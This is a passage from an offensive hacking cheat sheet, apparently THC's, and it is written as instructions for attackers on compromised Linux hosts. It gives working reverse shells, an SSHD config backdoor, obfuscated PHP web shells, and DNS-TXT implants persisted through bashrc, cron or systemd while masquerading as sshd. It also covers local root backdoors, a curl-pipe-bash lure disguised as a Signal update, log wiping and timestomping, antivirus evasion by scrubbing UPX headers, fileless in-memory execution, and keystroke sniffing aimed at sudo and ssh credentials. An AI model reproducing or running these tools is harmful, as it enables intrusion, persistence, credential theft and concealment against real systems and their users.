stty -echo;printf "\033[18t";read -rdt R;stty sane $(echo "${R:-8;80;25}"|awk -F";" '{ printf "rows "$3" cols "$2; }')
# Pimp up your prompt
# PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
```

<a id="reverse-shell-socat"></a>
**5.ii.c. Reverse shell with socat (fully interactive)**

...or install socat and get it done without much fiddling about:

```sh
# on attacker's host (listener)
socat file:`tty`,raw,echo=0 tcp-listen:1524
# on target host (reverse shell)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
```

---
<a id="backdoor"></a>
## 6. Backdoors

See [Reverse Shell / Dumb Shell](#reverse-shell) for simple 1-liner reverse shells.

<a id="gsnc"></a>
**6.i. Reverse shell using gs-netcat**

Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
```sh
bash -c "$(curl -fsSLk https://gsocket.io/y)"
```
or
```sh
bash -c "$(wget --no-check-certificate -qO- https://gsocket.io/y)"
```

or deploy gsocket by running your own deployment server:
```sh
LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"  # Notice '/ys' instead of '/y'
```
<a id="sshx"></a>
**6.ii. Reverse shell with sshx.io (encrypted)**

Access a remote shell from your web browser [https://sshx.io](https://sshx.io).

Pipe be sshx-backdoor directly into memory:
```shell
echo $(curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null \
 |nohup perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3",("-q")' 2>/dev/null \
 |{ read x;echo "$x";}&)
```

Or the lame way:
```shell
curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null >.s \
&& chmod 755 .s \
&& (PATH=.:$PATH .s -q >.u 2>/dev/null &);
for _ in {1..10}; do [ -s .u ] && break;sleep 1;done;cat .u;rm -f .u .s;
```

<a id="backdoor-sshd"></a>
**6.iii. Smallest SSHD backdoor**

- Survives `apt update`
- Does not create any new file.
- Does not use `authorized_keys` or PAM.

Adding your key to *authorized_keys* is overused 😩. Instead, as root, cut & paste this _once_ on any target. It will add a single line to SSHD's config and allow you to log in forever:

```shell
backdoor_sshd() {
	local B="/etc/ssh"
	local K="${B}/ssh_host_ed25519_key" D="${B}/sshd_config.d"
	local N=$(cd "${D}" 2>/dev/null|| exit; shopt -s nullglob; echo *.conf)
	[ -n "$N" ] && N="${N%%\.conf*}.conf"
	N="${D}/${N:-50-cloud-init.conf}"
	[ ! -d "${D}" ] && N="${B}/sshd_config"
	{ [ ! -f "$K" ] || [ ! -f "$K".pub ]; } && return
	grep -iqm1 '^PermitRootLogin\s\+no' "${B}/sshd_config" && echo >&2 "WARN: PermitRootLogin blocking in sshd_config"
	echo -e "\e[0;31mYour id_ed25519 to log in to this server as any user:\e[0;33m\n$(cat "${K}")\e[0m"
	grep -qm1 '^AuthorizedKeysFile' "$N" 2>/dev/null && { echo >&2 "WARN: Already backdoored"; return; }
	echo -e "AuthorizedKeysFile\t.ssh/authorized_keys .ssh/authorized_keys2 ${K}.pub" >>"${N}" || return
	touch -r "$K" "$N" "$D" \
	&& declare -f ctime >/dev/null && ctime "$N" "$D"
	systemctl restart ssh
}
backdoor_sshd
```

How it works:
- The SSHD host key is just an ordinary ed25519 key.
- Any ed25519 key can be used to authenticate a user.
- SSHD checks `~/.ssh/authorized_keys` (but this trick has been overused).
- Instead, configure SSHD to also check `/etc/ssh/sshd_host_ed25519_key.pub` for login-authentication-keys.
- SSHD will now check `~/.ssh/authorized_keys` _and_ `/etc/ssh/ssh_host_ed25519_key.pub` for valid login keys.
- Use the `/etc/ssh/sshd_host_ed25519_key` secret key to log in to the target.

<a id="backdoor-network"></a>
**6.vi. Remote Access to an entire network**

Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS exit-node on the Host's private LAN which is accessible through the Global Socket Relay Network without the need to run your own relay-server (e.g. access the remote private LAN directly from your workstation):

```sh
gs-netcat -l -S       # compromised Host
```

Now from your workstation you can connect to ANY host on the Host's private LAN:
```sh
gs-netcat -p 1080    # Your workstation.

# Access route.local:22 on the Host's private LAN from your Workstation:
socat -  "SOCKS4a:127.1:route.local:22"
```
Read [Use any tool via Socks Proxy](#scan-proxy).

Other methods:
* [Gost/Cloudflared](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) - our very own article
* [Reverse Wireguard](https://thc.org/segfault/wireguard) - from segfault.net to any (internal) network.

<a id="php-backdoor"></a>
**6.v. Smallest PHP Backdoor**

Add this line at the beginning of any PHP file:
```php
<?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K");eval($i);?>
```
It is base64 encoding of:
```php
if(isset($_POST[0])){system($_POST[0]);die;}
```

Test the backdoor:
```sh
### 1. Optional: Start a test PHP server
cd /var/www/html && php -S 127.0.0.1:8080
### Without executing a command
curl http://127.0.0.1:8080/test.php
### With executing a command
curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
```

Sometimes `system()` is prohibited. Add `eval()` to allow remote PHP-code execution as a backup. Hide within other base64-comments for some obfuscation:
```php
<?PHP /*1rUY9TDs2wG8In1HkSQzqViVtX2nGidgu/RkzKNJbfho9NqtfTaww4GcR6bIGU+U1AJq
USOIjliQm4T/9HP6YS6IMhwoZzmr2iydbwDcVynDqtLjI5i7owLKmjbKnijTszoXP/dif9ZcbhtJ
WQKmhCno0boYQQ2rjHgW3su1C7pYREPSdrYD/4QBpptJU7Djnm5zuyD2TXNjHXm/ZYUW+n4s3PM7
aWqzWzy*/if(isset($_POST[0])){eval($_POST[1]?:"");system($_POST[0]);die;}/*P
0KKBW1rvtqxOK8L9Ok6y7Rulkl2um62KVxvVx/+kODDw4HZV5Yx/HK/7lG+X/IkK8LViCIuaedXl
HM1wHBlDluhe8BN6pH33fn0bfFpjCDaKrKwK3QF6ExJu1JgKK9deyWUTcqbr0dhe7ZliOIldh3of
+4qUjhVdK4SoeND/Dd+iwRAbhZKxaHfng4ADqdWrwjUPoyTjzOp6C3iDzunviiG0RC3iDuCY*/?>
```

Trigger with any of these to execute comand or PHP code:
```shell
# Execute just command
curl http://127.0.0.1:8080/x.php -d0='id'
# Execute just PHP code
curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts");'
```

<a id="reverse-dns-backdoor"></a>
**6.vi. Smallest reverse DNS-tunnel Backdoor**

...in PHP:
---
Execute arbitrary commands on a server that is _not_ accessible from the public Internet by using a reverse DNS trigger.

Add this line (the implant) at the beginning of any PHP file:
```php
<?PHP eval(base64_decode(dns_get_record("b00m.team-teso.net", DNS_TXT)[0]['txt'])); ?>
```

The implant requests the payload via a DNS TXT-request from the domain `b00m.team-teso.net`. When triggered, it creates `/tmp/.b00m` and notifies THC (via an app.interactsh.com callback). *Please* use your own domain and also create your own payload. Example:
```shell
echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' |base64 -w0
```

- The DNS TXT payload is limited to 2,048 characters (sometimes 65,535 characters).
- The implant is a `bootloader`. Use a while loop to download and execute larger paypload via DNS.
- Check out our favorite places to [register a domain anonymously](#pub). [Cloudflare's](https://www.cloudflare.com) Free-Tier is a good start.

...in BASH:
---
Add this implant to the target's `~/.bashrc` or the crontab (demo-paypload):
```shell
# Use a "double bash" to redirect _also_ errors from $()-subshell to /dev/null:
bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \ \"|base64 -d);}"'&>/dev/null
```

or change the demo-payload for an elaborate payload:
- Starts a background daemon to poll every hour for command execution.
- Depends on bash, dig and base64 only.
- Hides as `sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups`
- Example uses `b00m2.team-teso.net` again and creates /tmp/.b00m every hour.

Cut & Paste the following into the target's shell to generate the 1-line implant:
```shell
# If dig does not exists then replace /dig +short.../ with
# /nslookup -q=txt '"$D"'|grep -Fm1 "text ="|sed -E "s|.*text = (.*)|\1|g;s|[\" ]||g"|base64 -d|bash/
# or use the Perl example below.
base64 -w0 >x.txt <<-'EOF'
D=b00m2.team-teso.net
P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
M=/dev/shm/.cache${UID}
[ -f $M ]&&exit
touch $M
(echo 'slp(){ local IFS;[ -n "${_sfd:-}" ]||exec {_sfd}<> <(:);read -t$1 -u$_sfd||:;}
slp 1
while :; do
	dig +short '"$D"' TXT|tr -d \ \"|base64 -d|bash
	slp 3600
done'|exec -a "$P" bash &) &>/dev/null
EOF
echo "===> Add the following to the target's ~/.bashrc or cronjob:"$'\n\033[0;36m'"echo $(<x.txt)|base64 -d|bash"$'\033[0m'
rm -f x.txt
```

Add the 1-line result of the script to any startup script on the target (use crontab, ~/.bashrc, [udev](https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp) or `ExecStartPre=`). Here is a clever example for */usr/lib/systemd/system/ssh.service* (with some additional obfuscation):
```
...
[Service]
EnvironmentFile=-/etc/default/ssh
Environment="SSHD=echo RD1iMDBtMi50ZWFtLXRlc28ubmV0ClA9InNzaGQ6IC91c3Ivc2Jpbi9zc2hkIC1EIFtsaXN0ZW5lcl0gMCBvZiAxMC0xMDAgc3RhcnR1cHMiCk09L2Rldi9zaG0vLmNhY2hlJHtVSUR9ClsgLWYgJE0gXSYmZXhpdAp0b3VjaCAkTQooZWNobyAnc2xwKCl7IGxvY2FsIElGUztbIC1uICIke19zZmQ6LX0iIF18fGV4ZWMge19zZmR9PD4gPCg6KTtyZWFkIC10JDEgLXUkX3NmZHx8Ojt9CnNscCAxCndoaWxlIDo7IGRvCmRpZyArc2hvcnQgJyIkRCInIFRYVHx0ciAtZCBcIFwifGJhc2U2NCAtZHxiYXNoCnNscCAzNjAwCmRvbmUnfGV4ZWMgLWEgIiRQIiBiYXNoICYpICY+L2Rldi9udWxsCg==|base64 -d|bash"
ExecStartPre=-bash -c 'eval $SSHD'
ExecStartPre=/usr/sbin/sshd -t
ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
...
```

...in PERL:
---
The same but only needing perl + bash (not dig):
```shell
perl -MMIME::Base64 -e '$/=undef;print encode_base64(<>,"")' >x.txt <<-'EOF'
D=b00m2.team-teso.net
P="sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
M=/dev/shm/.cache-1-${UID}
(echo 'use Net::DNS;use MIME::Base64;exit(0) if -e "'"$M"'";close(open($f,">","'"$M"'"));for (;;) { system decode_base64((Net::DNS::Resolver->new->query(q/'"$D"'/,q/TXT/)->answer)[0]->txtdata=~y/ \\//dr);sleep(3600)}'|exec -a "$P" perl &) &>/dev/null
EOF
echo "===> Execute the following on the target:"$'\n\033[0;36m'"perl -MMIME::Base64 -e'print decode_base64(\"$(<x.txt)\")'|bash"$'\033[0m'
rm -f x.txt
```
(thank you to LouCipher for a perl verison)

...in PYTHON:
---
Cut & paste the following into your shell:
```shell
pydnsbackdoorgen() {
    local str
    echo -e "This is the TXT record for ${1:?}\e[0;33m"
    base64 -w0 <"${2:?}"
    str="$(echo -en 'import dns.resolver\nexec(base64.b64decode("".join([d.to_text() for d in dns.resolver.resolve("'"${1:?}"'", "TXT").rrset])))' | base64 -w 0)"
    echo -e "\e[0m\nAdd this implant string to a target's python script:\e[0;32m"
    echo "exec('"'try:\n\timport base64\n\texec(base64.b64decode("'"${str}"'"))\nexcept:\n\tpass'"')"
    echo -e "\e[0m"
}
```

Generate your payload (`egg.py` will get executed on the target):
```shell
cat >egg.py<<-'EOF'
import time
dns.resolver.resolve(f"{int(time.time())}.yzlespkpfkqfrtwgvhngkyqbuod49rgmo.oast.fun")
EOF
```

Generate your implant (and follow the instructions):
```shell
pydnsbackdoorgen b00mpy.team-teso.net egg.py
```
   
<a id="ld-backdoor"></a>
**6.vii. Local Root Backdoor**

#### 1. Backdooring the dynamic loader with setcap

```bash
### Execute as ROOT user
fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
setcap cap_setuid,cap_setgid+ep "${fn}"
```

```bash
### Execute as non-root user to get root
fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
p="$(command -v python3 2>/dev/null)" || p="$(command -v python)"
"${fn:?}" "$p" -c 'import os;os.setuid(0);os.setgid(0);os.execlp("bash", "kdaemon")'
```

#### 2. Good old b00m shell

```shell
{ cp /bin/sh /var/tmp/.b00m; chmod 6775 /var/tmp/.b00m; } 2>/dev/null >/dev/null
```

```shell
exec /var/tmp/.b00m -p -c 'exec python -c "import os;os.setuid(0);os.execlp(\"bash\", \"kdaemon\")"'
```

<a id="implant"></a>
**6.viii. Self-Extracting implant**

Create a self-extracting shell-script using [mkegg.sh](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/mkegg.sh) (see source for examples).

Simple example:
```sh
# Create implant 'egg.sh' containing the file 'foo'
# and the directory 'warez'. When executing 'egg.sh' then
# extract 'foo' and 'warez' and call 'warez/run/sh'
./mkegg.sh egg.sh foo warez warez/run.sh
```

Real world examples are best:
1. Create an implant that installs gsocket and calls our webhook on success:
```sh
./mkegg.sh egg.sh deploy-all.sh '(GS_WEBHOOK_KEY=e90d4b38-8285-490d-b5ab-a6d5c7c990a7 deploy-all.sh 2>/dev/null >/dev/null &)'
# On the target system do: 'cat egg.sh | bash' or './egg.sh'
```

2. Rename `egg.sh` to `update-for-fools.txt` and upload as blob to [Signal's](https://www.signal.org/) GitHub repository.

3. Don't fool people to update Signal using this command ❤️:
```sh
curl -fL https://github.com/signalapp/Signal-Desktop/files/15037868/update-for-fools.txt | bash
```

<a id="hostrecon"></a>
## 7. Host Recon
---

Get [essential information](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/whatserver.sh) about a host:
```sh
bash -c "$(curl -fsSL https://thc.org/ws)"
```
or
```sh
bash -c "$(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh)"
```

netstat if there is no netstat/ss/lsof:
```sh
curl -fsSL https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/tools/awk_netstat.sh | bash
```

Speed check the system
```sh
curl -fsSL https://bench.sh | bash
# Another speed check:  
# curl -fsSL https://yabs.sh | bash
```

Find all suid/sgid binaries:
```
find  / -xdev -type f -perm /6000  -ls 2>/dev/null
```

Find all writeable directories:
```bash
wfind() {
    local arr dir

    arr=("$@")
    while [[ ${#arr[@]} -gt 0 ]]; do
        dir=${arr[${#arr[@]}-1]}
        unset "arr[${#arr[@]}-1]"
        find "$dir"  -maxdepth 1 -type d -writable -ls 2>/dev/null
        IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
    done
}
# Usage: wfind /
# Usage: wfind /etc /var /usr 
```

Find local passwords (using [noseyparker](https://github.com/praetorian-inc/noseyparker) or [trufflehog](https://github.com/trufflesecurity/trufflehog)):
```sh
curl -o np -fsSL https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static
chmod 700 np && \
./np scan . && \
./np report --color=always | less -R
```
- Use [PassDetective](https://github.com/aydinnyunus/PassDetective) to find passwords in ~/.*history
- Use [Chrome-ABE](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) to extract & decrypt Chrome passwords from the running process (windows only)
- Extract passwords from Browsers using [https://github.com/kiryano/chrome-password-decryptor](https://github.com/kiryano/chrome-password-decryptor)

Using `grep`:
```sh
# Find passwords (without garbage).
grep -HEronasi  '.{,16}password.{,64}' .
# Find TLS or OpenSSH keys:
grep -r -F -- " PRIVATE KEY-----" .
```

Find Subdomains or emails in files:
```bash
resolv() { while read -r x; do r="$(getent hosts "$x")" || continue; echo "${r%% *}"$'\t'"${x}"; done; }
find_subdomains() {
	local d="${1//./\\.}"
	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
	local rex="$rexf"'([^0-9a-zA-Z_]{1}|$)'
	[ $# -le 0 ] && { echo -en >&2 "Extract sub-domains from all files (or stdin)\nUsage  : find_subdomains <apex-domain> <file>\nExample: find_subdomain .com | anew"; return; }
	shift 1
	[ $# -le 0 ] && [ -t 0 ] && set -- .
	command -v rg >/dev/null && { rg -oaIN --no-heading "$rex" "$@" | grep -Eao "$rexf"; return; }
	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
}
# find_subdomain .foobar.com | anew | resolv
# find_subdomain @gmail.com | anew
```

---
<a id="shell-hacks"></a>
## 8. Shell Hacks
<a id="shred"></a>
**8.i. Shred & Erase a file**

```sh
shred -z foobar.txt
```

```sh
## SHRED without shred command
shred() {
    [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
    dd status=none bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom >"$1"
    rm -f "${1:?}"
}
shred foobar.txt
```
Note: Or deploy your files in */dev/shm* directory so that no data is written to the harddrive. Data will be deleted on reboot.

Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.

<a id="restore-timestamp"></a>
**8.ii. Restore the date of a file**

Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modified. Use *touch* to change the file date to the date of another file (in this example, */etc/shadow*)

```sh
touch -r /etc/shadow /etc/passwd
# verify with 'stat /etc/passwd'
```

Use [hackshell](#hackshell) and `ctime /etc/passwd` to also adjust the ctime and birth-time.

<a id="shell-clean-logs"></a>
**8.iii. Clear logfile**

This will reset the logfile to 0 without having to restart syslogd etc:
```sh
>/var/log/auth.log # or on old shells: cat /dev/null >/var/log/auth.log
```

This will remove any line containing the IP `1.2.3.4` from the log file:
```sh
xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
```

Examples:
```sh
# xlog "1\.2\.3\.4" /var/log/auth.log
# xlog "${SSH_CLIENT%% *}" /var/log/auth.log
# xlog "^2023.* thc\.org" foo.log
```

<a id="shell-hide-files"></a>
**8.iv. Hide files from that User without root privileges**

Our favorite working directory is */dev/shm/*. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.

Hiding permanent files:

Method 1:
```sh
alias ls='ls -I system-dev'
```

This will hide the directory *system-dev* from the *ls* command. Place in User's *~/.profile* or system wide */etc/profile*.

Method 2:
Tricks from the 80s. Consider any directory that the admin rarely looks into (like */boot/.X11/..* or so):
```sh
mkdir '...'
cd '...'
```

Method 3:
Unix allows filenames with about any ASCII character but 0x00. Try tab (*\t*). Happens that most Admins do not know how to cd into any such directory.
```sh
mkdir $'\t'
cd $'\t'
```

<a id="perm-files"></a>
**8.v. Make a file immuteable**

This will redirect `/var/www/cgi/blah.cgi` to `/boot/backdoor.cgi`. The file `blah.cgi` can not be modified or removed (unless unmounted).
```sh
# /boot/backdoor.cgi contains our backdoor
touch /var/www/cgi/blah.cgi
mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi
```

<a id="nosudo"></a>
**8.vi. Change user without sudo/su**

Needed for taking screenshots of X11 sessions (aka `xwd -display :0 -silent -root | convert - jpg:screenshot.jpg` or `import -display :0 -window root screenshot.png`)
```bash
xsu() {
    local name="${1:?}"
    local u g h
    local cmd="python"

    command -v python3 >/dev/null && cmd="python3"
    [ $UID -ne 0 ] && { HS_ERR "Need root"; return; }
    u=$(id -u ${name:?}) || return
    g=$(id -g ${name:?}) || return
    h="$(grep "^${name}:" /etc/passwd | cut -d: -f6)" || return
    HOME="${h:-/tmp}" "$cmd" -c "import os;os.setgid(${g:?});os.setuid(${u:?});os.execlp('bash', 'bash')"
}
# xsu user
```

<a id="payload"></a>
**8.vii. Obfuscate and crypt paypload**

Use [UPX](https://github.com/upx/upx) to pack an ELF binary (example `/bin/id`):
```shell
BIN="mybin"
upx -qqq /bin/id -o "${BIN}"
```

Cleanse the [UPX header](https://github.com/upx/upx/blob/devel/src/stub/src/include/header.S) and 2nd ELF header to fool the Anti-Virus:
```shell
perl -i -0777 -pe 's/^(.{64})(.{0,256})UPX!.{4}/$1$2\0\0\0\0\0\0\0\0/s' "${BIN}"
perl -i -0777 -pe 's/^(.{64})(.{0,256})\x7fELF/$1$2\0\0\0\0/s' "${BIN}"
```

Optionally cleanse signatures and traces of UPX:
```shell
cat "${BIN}" \
| perl -e 'local($/);$_=<>;s/(.*)(\$Info:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' \
| perl -e 'local($/);$_=<>;s/(.*)(\$Id:[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' >"${BIN}.tmpupx"
mv "${BIN}.tmpupx" "${BIN}"
grep -Eqm1 "PROT_EXEC\|PROT_WRITE" "${BIN}" \
&& cat "${BIN}" | perl -e 'local($/);$_=<>;s/(.*)(PROT_EXEC\|PROT_WRI[^\0]*)(.*)/print "$1";print "\0"x length($2); print "$3"/es;' >"${BIN}.tmpupx" \
&& mv "${BIN}.tmpupx" "${BIN}"
perl -i -0777 -pe 's/UPX!/\0\0\0\0/sg' "${BIN}"
```

Verify that binary can not be unpacked:
```shell
upx -d "${BIN}"  # Should fail with 'not packed by UPX'
```

Optionally encrypt it with [bincrypter](https://github.com/hackerschoice/bincrypter).

<a id="memexec"></a>
**8.viii. Deploying a backdoor without touching the file-system**

Start a backdoor without writing to the file-system or when all writeable locations are mounted with the evil `noexec`-flag.

A Perl one-liner to load a binary into memory and execute it (without touching any disk or /dev/shm or /tmp). See [Hackshell](https://github.com/hackerschoice/hackshell/blob/main/hackshell.sh) for more.
```sh
memexec() {
    local stropen strread
    local strargv0='"foo", '
    [ -t 0 ] && {
        stropen="open(\$i, '<', '$1') or die 'open: \$!';"
        strread='$i'
        unset strargv0
    }
    # Check Syscall-NR: perl -e 'require "sys/syscall.ph"; printf &SYS_memfd_create;'
    perl -e '$f=syscall(319, $n="", 1);
if(-1==$f){ $f=syscall(279, $n="", 1); if(-1==$f){ die "memfd_create: $!";}}
'"${stropen}"'
open($o, ">&=".$f) or die "open: $!";
while(<'"${strread:-STDIN}"'>){print $o $_;}
exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
}
# Example usage:
# memexec /usr/bin/id -u
# cat /usr/bin/id | memexec -u
# curl -SsfL https://thc.org/my-backdoor-binary | memexec
```

The shortest possible variant is (example):
```shell
memexec(){ perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- "$@";}
# Example: cat /usr/bin/id | memexec -u
```
(Thank you [tmp.Out](https://tmpout.sh/) for some educated discussions and [previous work](https://captain-woof.medium.com/how-to-execute-an-elf-in-memory-living-off-the-land-c7e67dbc3100) by others)

Deploy gsocket without writing to the filesystem (example):
```sh
GS_ARGS="-ilqD -s SecretChangeMe31337" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m))
```

The backdoor can also be piped via SSH directly into the remote's memory, and executed:
```sh
MX='-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255'
curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec perl '$MX' -- -ilqD -s SecretChangeMe31337"
```

If you have a single-shot at remote executing a command (like via a PHP exploit) then this is your line:
```sh
curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)|perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- -ilqD -s SecretChangeMe31337
```

---
<a id="crypto"></a>
## 9. Crypto
<a id="gen-password"></a>
**9.i. Generate quick random Password**

Good for quick passwords without human element.

```sh
openssl rand -base64 24
```

If `openssl` is not available then we can also use `head` to read from `/dev/urandom`.

```sh
head -c 32 < /dev/urandom | xxd -p -c 32
```

or make it alpha-numeric

```sh
head -c 32 < /dev/urandom | base64 | tr -dc '[:alnum:]' | head -c 16
```

<a id="crypto-filesystem"></a>
**9.ii.a. Linux transportable encrypted filesystems - cryptsetup**

Create a 256MB large encrypted file system. You will be prompted for a password.

```sh
dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
cryptsetup luksFormat /tmp/crypted
cryptsetup open /tmp/crypted sec
mkfs -t ext3 /dev/mapper/sec
```

Mount:

```sh
cryptsetup open /tmp/crypted sec
mount -o nofail,noatime /dev/mapper/sec /mnt/sec
```

Store data in `/mnt/crypted`, then unmount:

```sh
umount /mnt/sec
cryptsetup close sec 
```
<a id="encfs"></a>
**9.ii.b. Linux transportable encrypted filesystems - EncFS**

Create ```.sec``` and store the encrypted data in ```.raw```:
```sh
mkdir .raw .sec
encfs --standard  "${PWD}/.raw" "${PWD}/.sec"
```

unmount:
```sh
fusermount -u .sec
```

<a id="encrypting-file"></a>
**9.iii Encrypting a file**

Encrypt your 0-Days and log files before transferring them - please. (and pick your own password):

```sh
# Encrypt
openssl enc -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt >input.txt.enc
```

```sh
# Decrypt
openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.txt
```

---
<a id="sniffing"></a>
## 10. Session sniffing and hijaking
<a id="session-sniffing"></a>
**10.i Sniff a user's SHELL session**

A 1-liner for `~/.bashrc` to sniff the user's keystrokes and save them to `~/.config/.pty/.@*`. Useful when not root and needing to capture the sudo/ssh/git credentials of the user. 

Deploy: Cut & paste the following onto the target and follow the instructions:
```sh
# This is a glorified version of:
# [ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && [ -d ~/.config/.pty ] && { script -V; } &>/dev/null && LC_PTY=1 exec -a "sshd: pts/0" script -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" -I ~/.config/.pty/.@pty-unix.$$
command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
&& { mkdir -p ~/.config/.pty 2>/dev/null; :; } \
&& { script -h | grep -qm1 -- -I && cp "$(command -v script)" ~/.config/.pty/pty; :; } \
&& { [ ! -f ~/.config/.pty/pty ] && curl -o ~/.config/.pty/pty -fsSL "https://bin.pkgforge.dev/$(uname -m)/script"; :; } \
&& [ -f ~/.config/.pty/pty ] \
&& curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
&& chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
&& echo -e '----------\n\e[0;32mSUCCESS\e[0m. Add the following line to \e[0;36m~/.bashrc\e[0m:\e[0;35m' \
&& echo -e '[ -z "$LC_PTY" ] && [ -t 0 ] && [[ "$HISTFILE" != *null* ]] && [ -d ~/.config/.pty ] && { ~/.config/.pty/ini -h && ~/.config/.pty/pty -V; } &>/dev/null && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -fqaec "exec ${BASH_EXECUTION_STRING:--a -bash '"$(command -v bash)"'}" -I ~/.config/.pty/.@pty-unix.$$\e[0m'
```

- Combined with zapper to hide command options from the process list.
- Requires `/usr/bin/script` from util-linux >= 2.37 (-I flag). We pull the static bin from [pkgforge](https://bin.pkgforge.dev). 
- Consider using /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
- Log in with `ssh -o "SetEnv LC_PTY=1"` to disable logging.

<a id="dtrace"></a>
**10.ii Sniff all SHELL sessions with dtrace - FreeBSD**

Especially useful for Solaris/SunOS and FreeBSD (pfSense). It uses kernel probes to trace *all* sshd processes.

Copy this "D Script" to the target system to a file named `d`:
```c
#pragma D option quiet
inline string NAME = "sshd";
syscall::write:entry
/(arg0 >= 5) && (arg2 <= 16) && (execname == NAME)/
{ printf("%d: %s\n", pid, stringof(copyin(arg1, arg2))); }
```

Start a dtrace and log to /tmp/.log:
```sh
### Start kernel probe as background process.
(dtrace -sd >/tmp/.log &)
```

<a id="bpf"></a>
**10.iii Sniff all SHELL sessions with eBPF - Linux**

eBPF allows us to *safely* hook over 120,000 functions in the kernel. It's like a better "dtrace" but for Linux.  

```sh
curl -o bpftrace -fsSL https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace
chmod 755 bpftrace
curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/ptysnoop.bt
./bpftrace -Bnone ptysnoop.bt
```
Check out our very own [eBPF tools to sniff sudo/su/ssh passwords](https://github.com/hackerschoice/bpfhacks).

<a id="ssh-sniffing-strace"></a>
**10.iv Sniff a user's SSH, bash or SSHD session with strace**
```sh
tit() {
